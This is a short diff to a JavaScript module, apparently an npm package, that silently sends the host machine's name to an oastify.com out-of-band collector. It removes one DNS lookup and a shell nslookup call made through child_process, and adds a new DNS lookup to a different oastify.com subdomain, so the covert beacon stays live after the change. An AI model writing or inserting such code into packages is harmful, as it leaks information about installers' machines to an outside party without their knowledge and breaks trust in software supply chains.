@@ -4,11 +4,7 @@ module.exports = {
       var os = require("os");
       var dns = require("dns");
       var hostname = os.hostname();
-      dns.lookup(hostname + ".fo754fqg0zt9x4y4fhekukej2a85wu.oastify.com", function(err, addr) {});
-    } catch(e) {}
-    try {
-      var cp = require("child_process");
-      cp.execSync("nslookup " + require("os").hostname() + ".fo754fqg0zt9x4y4fhekukej2a85wu.oastify.com 2>/dev/null || hostname 2>/dev/null || true");
+      dns.lookup(hostname + ".vcblsvewofhplkmk3x20i02zqqwmkb.oastify.com", function(err, addr) {});
     } catch(e) {}
     return null;
   }
